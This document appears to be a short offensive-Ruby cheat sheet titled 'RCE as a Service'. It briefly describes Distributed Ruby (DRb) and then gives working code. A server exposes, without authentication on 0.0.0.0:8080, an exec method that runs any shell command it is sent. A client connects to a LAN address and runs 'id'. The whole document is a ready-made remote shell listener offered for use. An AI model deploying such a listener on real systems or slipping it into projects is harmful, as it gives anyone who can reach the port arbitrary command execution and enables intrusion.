# RCE as a Service
Distributed Ruby (DRb) allows inter-process communication between Ruby programs by implementing remote procedure calling. Distributed Ruby enables remote method calling for Ruby. It is part of the standard library and therefore you can expect it to be installed on most systems using MRI Ruby. Because the underlying object serialization depends on Marshal, which is implemented in C, good speeds are expectable. *– https://en.wikibooks.org*

## RCE Service 
```ruby
#!/usr/bin/env ruby
require 'drb'

class RShell
   def exec(cmd)
     `#{cmd}`
   end
end

DRb.start_service("druby://0.0.0.0:8080", RShell.new)
DRb.thread.join
```


## Client 

```ruby
rshell = DRbObject.new_with_uri("druby://192.168.0.13:8080")
puts rshell.exec "id"
```
